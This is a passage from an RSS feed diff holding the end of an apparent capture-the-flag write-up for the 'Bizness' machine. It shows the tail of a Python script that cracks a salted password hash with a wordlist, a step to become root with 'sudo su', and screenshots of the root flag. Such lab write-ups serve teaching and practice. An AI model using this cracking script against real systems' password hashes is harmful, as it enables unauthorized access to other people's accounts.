+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">findhash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">attempts&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wordlist&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">password_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[+] Attempting to crack....&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">password&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">password_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">attempts&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cryptBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">hashed_password&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hash_string&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;Found Password: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;hash: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hashed_password&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;(Attempts: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">attempts&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[!] Super, I bet you could log into something with that!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[!] Password not found in the wordlist. :( (Attempts: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">attempts&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Crack the password : mon*********s and do&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo su
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Voila !&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root.png"
+width="926"
+height="240"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root_hu1acca673751cca7afff534719c92d1ed_59760_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root_hu1acca673751cca7afff534719c92d1ed_59760_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Root flag"
+class="gallery-image"
+data-flex-grow="385"
+data-flex-basis="926px"
+>&lt;/p>
+&lt;p>This intricate process showcases the meticulous steps taken to navigate through files, directories, and databases, employing various commands to unveil crucial information and execute a successful privilege escalation.&lt;/p>
+&lt;h2 id="done">Done&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done.png"
+width="618"
+height="551"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done_hu339944034bf17a4556fdba8e42068f0d_104309_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done_hu339944034bf17a4556fdba8e42068f0d_104309_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="The Ebd"
+class="gallery-image"
+data-flex-grow="112"
+data-flex-basis="269px"
+>&lt;/p></description></item></channel></rss>
